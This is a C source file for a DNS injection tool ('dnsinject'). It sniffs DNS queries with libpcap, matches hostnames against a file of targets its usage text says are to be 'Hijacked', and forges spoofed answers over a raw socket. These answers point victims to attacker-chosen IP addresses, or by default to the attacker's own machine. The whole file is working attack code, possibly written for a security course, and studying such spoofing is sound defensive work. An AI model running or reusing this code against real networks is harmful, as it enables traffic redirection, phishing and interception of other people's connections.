#include <stdio.h>
#include <ctype.h>
#include <pcap.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <getopt.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

/* Offsets of fields in the DNS header. */
#define DNS_ID      0
#define DNS_FLAGS   2
#define DNS_QUEST   4
#define DNS_ANS     6
#define DNS_AUTH    8
#define DNS_ADD     10
 
/* Length of DNS header. */
#define DNS_HDRLEN  12
 
//Type field of Query and Answer
#define T_A 1 /* host address */
#define T_NS    2 /* authoritative server */
#define T_CNAME 5 /* canonical name */
#define T_SOA   6 /* start of authority zone */
#define T_PTR   12 /* domain name pointer */
#define T_MX    15 /* mail routing information */

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* IP header */
struct sniff_ip {
        u_char  ip_vhl;                 /* version << 4 | header length >> 2 */
        u_char  ip_tos;                 /* type of service */
        u_short ip_len;                 /* total length */
        u_short ip_id;                  /* identification */
        u_short ip_off;                 /* fragment offset field */
        #define IP_RF 0x8000            /* reserved fragment flag */
        #define IP_DF 0x4000            /* dont fragment flag */
        #define IP_MF 0x2000            /* more fragments flag */
        #define IP_OFFMASK 0x1fff       /* mask for fragmenting bits */
        u_char  ip_ttl;                 /* time to live */
        u_char  ip_p;                   /* protocol */
        u_short ip_sum;                 /* checksum */
        struct  in_addr ip_src,ip_dst;  /* source and dest address */
};
#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

struct sniff_udp {
         u_short uh_sport;               /* source port */
         u_short uh_dport;               /* destination port */
         u_short uh_ulen;                /* udp length */
         u_short uh_sum;                 /* udp checksum */

};

#define SIZE_UDP        8               /* length of UDP header */

struct DNS_HEADER {
        unsigned        id :16;         /* query identification number */
#if BYTE_ORDER == BIG_ENDIAN
                        /* fields in third byte */
        unsigned        qr: 1;          /* response flag */
        unsigned        opcode: 4;      /* purpose of message */
        unsigned        aa: 1;          /* authoritive answer */
        unsigned        tc: 1;          /* truncated message */
        unsigned        rd: 1;          /* recursion desired */
                        /* fields in fourth byte */
        unsigned        ra: 1;          /* recursion available */
        unsigned        unused :3;      /* unused bits (MBZ as of 4.9.3a3) */
        unsigned        rcode :4;       /* response code */
#endif
#if BYTE_ORDER == LITTLE_ENDIAN || BYTE_ORDER == PDP_ENDIAN
                        /* fields in third byte */
        unsigned        rd :1;          /* recursion desired */
        unsigned        tc :1;          /* truncated message */
        unsigned        aa :1;          /* authoritive answer */
        unsigned        opcode :4;      /* purpose of message */
        unsigned        qr :1;          /* response flag */
                        /* fields in fourth byte */
        unsigned        rcode :4;       /* response code */
        unsigned        unused :3;      /* unused bits (MBZ as of 4.9.3a3) */
        unsigned        ra :1;          /* recursion available */
#endif
                        /* remaining bytes */
        unsigned        qdcount :16;    /* number of question entries */
        unsigned        ancount :16;    /* number of answer entries */
        unsigned        nscount :16;    /* number of authority entries */
        unsigned        arcount :16;    /* number of resource entries */
};

unsigned char* ReadName(const unsigned char* reader, int* count)
{
	unsigned char *name;
	unsigned int p=0,jumped=0,offset;
	int i , j;
 
	*count = 1;
	name = (unsigned char*)malloc(256);
 
	name[0]='\0';
 
	//read the names in 3www6google3com format
	while(*reader!=0)
	{
		name[p++]=*reader;
		reader=reader+1;
 
		if(jumped==0)
			*count = *count + 1; //if we havent jumped to another location then we can count up
	}
 
	name[p]='\0'; //string complete
	if(jumped==1) 
	{
		*count = *count + 1; //number of steps we actually moved forward in the packet
	}
 
    //now convert 3www6google3com0 to www.google.com
	for(i=0;i<(int)strlen((const char*)name);i++)
	{
		p=name[i];
		for(j=0;j<(int)p;j++)
		{
			name[i]=name[i+1];
			i=i+1;
		}
		name[i]='.';
	}
     
	name[i-1]='\0'; //remove the last dot
     
	return name;
}

//this will convert www.google.com to 3www6google3com ;got it :)
void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host)
{
	int lock=0 , i;

	strcat((char*)host,"."); 
	for(i=0 ; i<(int)strlen((char*)host) ; i++)
	{
		if(host[i]=='.')
		{
			*dns++=i-lock;
			for(;lock<i;lock++)
			{
				*dns++=host[lock];
			}
			lock++; //or lock=i+1;
		}
	}
	*dns++='\0';
}

struct QUESTION
{
	unsigned short qtype;
	unsigned short qclass;
};

struct RES_RECORD {
        unsigned short name;
        unsigned short type;
        unsigned short _class;
        unsigned int ttl;
        unsigned short data_len;
        unsigned int rdata;
}__attribute__((packed));

struct map {
        char hostnames[100][100];
        char ip_addrs[100][100];
        int len;
};

void print_usage(void) {
	printf("./dnsinject [-i interface] [-f file] expression\n");
	printf("-i  Listen on network device <interface> (e.g., eth0).\n");
	printf("-f  File with Ip addresses and Hostnames to be Hijacked\n");
	printf("<expression> is a BPF filter that specifies which packets will be monitored.\n");
}

void print_something(unsigned char *args) {
        struct map *Map1;
        int len, j;

        Map1 = (struct map*)args;
        len = Map1->len;
        for (j = 0; j < len; j++)
                printf("Host Name : %s and IP : %s\n", Map1->hostnames[j], Map1->ip_addrs[j]);
}

int search_hostname(unsigned char *args, char *str) {
        struct map *Map1;
        int len, j;

        Map1 = (struct map*)args;
        len = Map1->len;
	if (len == 0)
		return 0;
        for (j = 0; j < len; j++) {
                if (strcmp(Map1->hostnames[j], str) == 0) {
//                        printf("Found IP : %s\n", Map1->ip_addrs[j]);
                        return j;
                }
        }
//        printf("No IP Found\n");
	return -1;
}

static void print_ip_packet(const struct sniff_ip *ip, struct sniff_ip *resp_ip) {

	printf("(Query IP) From : %s ", inet_ntoa(ip->ip_src));
	printf("(Response IP) From : %s\n", inet_ntoa(resp_ip->ip_src));
	printf("(Query IP) To : %s ", inet_ntoa(ip->ip_dst));
	printf("(Response IP) To : %s\n", inet_ntoa(resp_ip->ip_dst));
	printf("(Query IP) Len : %d ", ntohs(ip->ip_len));
	printf("(Response IP) Len : %d\n", ntohs(resp_ip->ip_len));
	printf("(Query IP) TTL : %d ", ip->ip_ttl);
	printf("(Response IP) TTL : %d\n", resp_ip->ip_ttl);
}

static void print_udp_packet(const struct sniff_udp *udp, struct sniff_udp *resp_udp) {

	printf("(Query UDP) From : %d ", ntohs(udp->uh_sport));
	printf("(Response UDP) From : %d\n", ntohs(resp_udp->uh_sport));
	printf("(Query UDP) To : %d ", ntohs(udp->uh_dport));
	printf("(Response UDP) To : %d\n", ntohs(resp_udp->uh_dport));
	printf("(Query UDP Len : %d ", ntohs(udp->uh_ulen));
	printf("(Response UDP Len : %d\n", ntohs(resp_udp->uh_ulen));
	printf("(Query UDP) Sum : %d ", ntohs(udp->uh_sum));
	printf("(Response UDP) Sum : %d\n", ntohs(resp_udp->uh_sum));
}

static void print_dns_packet(const struct DNS_HEADER *dns, struct DNS_HEADER *resp_dns) {

   	printf("(Query DNS) ID : %d ", ntohs(dns->id));	
     	printf("(Response DNS) ID : %d\n", ntohs(resp_dns->id));
	printf("(Query DNS) qr : %d ", dns->qr);
	printf("(Response DNS) qr : %d\n", resp_dns->qr);
	printf("(Query DNS) opcode : %d ", dns->opcode);
	printf("(Response DNS) opcode : %d\n", resp_dns->opcode);
	printf("(Query DNS) AA : %d ", dns->aa);
	printf("(Response DNS) AA : %d\n", resp_dns->aa);
	printf("(Query DNS) TC : %d ", dns->tc);
	printf("(Response DNS) TC : %d\n", resp_dns->tc);
	printf("(Query DNS) RD : %d ", dns->rd);
	printf("(Response DNS) RD : %d\n", resp_dns->rd);
	printf("(Query DNS) RA : %d ", dns->ra);
	printf("(Response DNS) RA : %d\n", resp_dns->ra);
	printf("(Query DNS) Z : %d ", dns->unused);
	printf("(Response DNS) Z : %d\n", resp_dns->unused);
	printf("(Query DNS) Rcode : %d ", dns->rcode);
	printf("(Response DNS) Rcode : %d\n", resp_dns->rcode);
	printf("(Query DNS) QD Count : %d ", ntohs(dns->qdcount));
	printf("(Response DNS) QD Count : %d\n", ntohs(resp_dns->qdcount));
	printf("(Query DNS) AN Count : %d ", ntohs(dns->ancount));
	printf("(Response DNS) AN Count : %d\n", ntohs(resp_dns->ancount));
	printf("(Query DNS) NS Count : %d ", ntohs(dns->nscount));
	printf("(Response DNS) NS Count : %d\n", ntohs(resp_dns->nscount));
	printf("(Query DNS) AR Count : %d ", ntohs(dns->arcount));
	printf("(Response DNS) AR Count : %d\n", ntohs(resp_dns->arcount));
}

static void print_query_packet(char *qname, struct QUESTION *question) {
	
	printf("qname : %s\n", qname);
	printf("Q Type : %d\n", ntohs(question->qtype));
	printf("Q Class : %d\n", ntohs(question->qclass));
}

static void print_response_packet(struct RES_RECORD *response) {

	struct in_addr source;
		
	printf("Response Type : %d\n", ntohs(response->type));
	printf("Response Class : %d\n", ntohs(response->_class));
	printf("Response TTL : %d\n", response->ttl);
	printf("Response Data Len : %d\n", ntohs(response->data_len));
	memset(&source, 0, sizeof(source));
	source.s_addr = response->rdata;
	printf("Response rdata : %s\n", inet_ntoa(source));
}

/*
 *  * dissect/print packet
 *   */
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	const struct sniff_ip *ip;              /* The IP header */
	struct sniff_ip *resp_ip;
	const struct sniff_udp *udp;		/* The UDP header*/
	struct sniff_udp *resp_udp;
	int size_ip, count = 0;
	bool frthr_analysis = false;
	unsigned offset = 0, resp_offset = 0;
	struct DNS_HEADER *dns, *resp_dns;
	struct QUESTION *question, *resp_question;
	char *qname;
	const u_char *temp;
	unsigned int p = 0;
	int i, j, index;
	struct map *Map1;
	struct RES_RECORD *response, *resp_response;
	unsigned char buf[65536];

	memset(buf, 0, 65536);
	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);	
	size_ip = IP_HL(ip)*4;

//	if (size_ip < 20) {
//		printf("   * Invalid IP header length: %u bytes\n", size_ip);
//		return;
//	}
	
	switch(ip->ip_p) {
		case IPPROTO_TCP:
			frthr_analysis = false;
			break;
		case IPPROTO_UDP:
			frthr_analysis = true;
			break;
		case IPPROTO_ICMP:
			frthr_analysis = false;
			break;
		case IPPROTO_IP:
			return;
		default:
			return;
	}

	if (frthr_analysis) {	
		/* define/compute udp header offset */
                udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + size_ip);

		if (ntohs(udp->uh_dport) == 53) {
			/* print source and destination IP addresses */
			offset = SIZE_ETHERNET + size_ip + SIZE_UDP;  
			dns = (struct DNS_HEADER *)(packet + offset);
 
			offset += DNS_HDRLEN;
			/* Parse the QNAMe until \0 */
			temp = packet + offset;
			int qname_len = 0, stop = 0;

			qname = ReadName(temp, &qname_len);
			printf("Query Name : %s\n", qname);
			question = (struct QUESTION *)(temp + qname_len);
			/*Query*/

			Map1 = (struct map*)args;
			index = search_hostname((unsigned char*)Map1, qname);
        		if (index != -1) {
//                		printf("IP : %s\n", Map1->ip_addrs[index]);
			/*Response IP Header*/
				resp_ip = (struct sniff_ip*)&buf;
				memcpy(resp_ip, ip, size_ip);
//				printf("Response Offset : %d\n", resp_offset);
				resp_offset = resp_offset + size_ip;
//				printf("Response Offset : %d\n", resp_offset);
				/*Swap the src and dest*/
				resp_ip->ip_src.s_addr = ip->ip_dst.s_addr;
				resp_ip->ip_dst.s_addr = ip->ip_src.s_addr;
				/*Change the TTL*/
				resp_ip->ip_ttl = 255;
			/*Response UDP Header*/
				resp_udp = (struct sniff_udp*)&buf[resp_offset];
				memcpy(resp_udp, udp, SIZE_UDP);
				resp_offset = resp_offset + SIZE_UDP;
//				printf("Response Offset : %d\n", resp_offset);
				/*Swap source and destination Ports*/
				resp_udp->uh_sport = udp->uh_dport;
				resp_udp->uh_dport = udp->uh_sport;
				/*Make UDP checksum as 0*/
				resp_udp->uh_sum = 0;
			/*Response DNS Header*/
				resp_dns = (struct DNS_HEADER*)&buf[resp_offset];
				memcpy(resp_dns, dns, DNS_HDRLEN);
				resp_offset = resp_offset + DNS_HDRLEN;
//				printf("Response Offset : %d\n", resp_offset);
				/*Change response flag*/
				resp_dns->qr = 1;
				/*Change Recursive Available*/
				resp_dns->ra = 1;
				/*Change Unused bits*/
				resp_dns->unused = 0;
				/*Change answer count*/
				resp_dns->ancount = htons(1);
				/*Update Additional count to 0*/
				resp_dns->arcount = 0;
			/*Response Query Header*/
				/*Blindly copy the query part from incoming packet*/
				memcpy(&buf[resp_offset], packet + (SIZE_ETHERNET + size_ip + SIZE_UDP + DNS_HDRLEN),
							qname_len + sizeof(struct QUESTION));
				resp_offset = resp_offset + (qname_len + sizeof(struct QUESTION));
//				printf("Response Offset : %d\n", resp_offset);
			/*Response Answer Header & Pay Load*/		
				response = (struct RES_RECORD *)malloc(sizeof(struct RES_RECORD));

				response->name = htons(49164);
				response->type = htons(1);
				response->_class = htons(1);
				response->ttl = htonl(6000);
				response->data_len = htons(4);
				inet_pton(AF_INET, Map1->ip_addrs[index], &response->rdata);
					
				/*Copy the response*/
				memcpy(&buf[resp_offset], response, sizeof(struct RES_RECORD));
				resp_offset = resp_offset + sizeof(struct RES_RECORD);
//				printf("Response Offset : %d\n", resp_offset);
				
				free(response);

				/*Update IP packet Total Length*/
				resp_ip->ip_len = htons(resp_offset);

				/*Change UDP Packet Total Length*/
				resp_udp->uh_ulen = htons(ntohs(resp_ip->ip_len) - size_ip);

/*				print_ip_packet(ip, (struct sniff_ip *)&buf);
				print_udp_packet(udp, (struct sniff_udp *)&buf[size_ip]);
				print_dns_packet(dns, (struct DNS_HEADER *)&buf[size_ip + SIZE_UDP]);
				char *qname1;
				qname_len = 0;
				qname1 = ReadName(&buf[size_ip + SIZE_UDP + DNS_HDRLEN], &qname_len);
				print_query_packet(qname1, (struct QUESTION*)&buf[size_ip + 
								SIZE_UDP + DNS_HDRLEN + qname_len]);
				free(qname1);
				print_response_packet((struct RES_RECORD *)&buf[size_ip +
								SIZE_UDP + DNS_HDRLEN + qname_len 
								+ sizeof(struct QUESTION)]); */
				int sock = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
				int one = 1;
				const int *val = &one;
				if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
					printf ("Error setting IP_HDRINCL. Error number : %d. Error message : %s \n" , errno , strerror(errno));
					exit(0);
                		}

				int sent;
				struct sockaddr_in dest;
				dest.sin_family=AF_INET;
				dest.sin_port=htons(53);
				dest.sin_addr.s_addr = resp_ip->ip_dst.s_addr;

				if( (sent = sendto(sock, (char*)buf, ntohs(resp_ip->ip_len), 0, 
					(struct sockaddr*)&dest, sizeof(dest))) < 0) {
					perror("Send packet Failed");
				} else {
					printf("SuccessFully sent Answer : %s (%d)\n", Map1->ip_addrs[index], sent);
				}
			} else {
				printf("No spoofed IP found for this Hostname\n");
			}
			free(qname);
		}
	}
}


int main(int argc, char **argv) {
	int c, index;
	char *interface = NULL;
	char *file = NULL;
	char *expr = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t *handle = NULL;
	struct bpf_program fp;          /* The compiled filter expression */
        bpf_u_int32 mask;               /* The netmask of our sniffing device */
        bpf_u_int32 net;                /* The IP of our sniffing device */
        bool set = false;
	struct map *Map1;
	FILE *filePtr;
	char *line = NULL, *str1 = NULL, *token = NULL;
	char *saveptr1;
	size_t len = 0;
	ssize_t read;
	int j;
	int mapSize = 0;

	opterr = 0;
	Map1 = (struct map*)malloc(sizeof(struct map));
	while (c = getopt(argc, argv, "hi:f:")) {
		switch (c) {
                        case 'h' :
                                print_usage();
                                return 0;
                        case 'i' :
                                interface = optarg;
                                break;
                        case 'f' :
                                file = optarg;
                                break;
                        case '?' :
                                if (optopt == 'i' || optopt == 'f')
                                        fprintf(stderr, "Option -%c requires an argument.\n", optopt);
                                else if (isprint(optopt))
                                        fprintf(stderr, "Unknown option -%c.\n", optopt);
                                else
                                        fprintf(stderr, "Unknown option character `\\x%x'.\n", optopt);
                                return 1;
                        default :
                                goto out;
                }
	}
out:
	for (index = optind; index < argc; index++)
		expr = argv[index];

//	printf("interface : %s\n", interface);
//	printf("file : %s\n", file);
//	printf("expr : %s\n", expr);

	if (file) {
		filePtr = fopen(file, "r");
		if (filePtr == NULL) {
                	perror("open error");
                	return -1;
        	}
		while ((read = getline(&line, &len, filePtr)) != -1) {
			for (j = 1, str1 = line; ; j++, str1 = NULL) {
				token = strtok_r(str1, "\t", &saveptr1);
				if (token == NULL)
					break;
				if (j == 1) {
					strncpy(Map1->ip_addrs[mapSize], token, strlen(token));
					Map1->ip_addrs[mapSize][strlen(token)] = '\0';
				} else if (j == 2) {
					strncpy(Map1->hostnames[mapSize], token, strlen(token)-1);
					Map1->hostnames[mapSize][strlen(token)-1] = '\0';
				}
			}
			mapSize++;
		}
		Map1->len = mapSize;
		fclose(filePtr);
	} else {
		mapSize = 0;
		Map1->len = mapSize;
		int fd;
		struct ifreq ifr;

		fd = socket(AF_INET, SOCK_DGRAM, 0);

		/* I want to get an IPv4 IP address */
		ifr.ifr_addr.sa_family = AF_INET;

		/* I want IP address attached to "eth0" */
		strncpy(ifr.ifr_name, "ens33", IFNAMSIZ-1);

		ioctl(fd, SIOCGIFADDR, &ifr);

		close(fd);

		/* display result */
		token = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
		strncpy(Map1->ip_addrs[mapSize], token, strlen(token));
		Map1->ip_addrs[mapSize][strlen(token)] = '\0';
	}

//	print_something((unsigned char*)Map1);
//	index = search_hostname((unsigned char*)Map1, "www.fsl.com");
//	if (index != -1) {
//		printf("IP : %s\n", Map1->ip_addrs[index]);
//	}

	if (!interface) {
		interface = pcap_lookupdev(errbuf);
		if (!interface) {
                	fprintf(stderr, "Couldn't find default device : %s\n", errbuf);
                        return (2);
                }
	}

	handle = pcap_open_live(interface, BUFSIZ, 1, -1, errbuf);
	if (!handle) {
		fprintf(stderr, "Couldn't open device : %s\n", errbuf);
		return (2);
	}

	if (pcap_datalink(handle) != DLT_EN10MB) {
		fprintf(stderr, "Device %s doesn't provide Ethernet headers - not supported\n", interface);
		return (2);
        }

	if (expr) {
		if (interface && (pcap_lookupnet(interface, &net, &mask, errbuf) == -1)) {
			fprintf(stderr, "Can't get netmask for device %s\n", interface);
			net = 0;
			mask = 0;
		} else {
			net = 0;
			mask = 0;
		}

		if (pcap_compile(handle, &fp, expr, 0, net) == -1) {
			fprintf(stderr, "Couldn't parse filter %s: %s\n", expr, pcap_geterr(handle));
			return(2);
		}
                set = true;

		if (pcap_setfilter(handle, &fp) == -1) {
			fprintf(stderr, "Couldn't install filter %s: %s\n", expr, pcap_geterr(handle));
			return(2);
                }
        }

	pcap_loop(handle, 1000, got_packet, (u_char *)Map1);

	if (set)
		pcap_freecode(&fp);

	free(Map1);

	pcap_close(handle);
	
return 0;
}
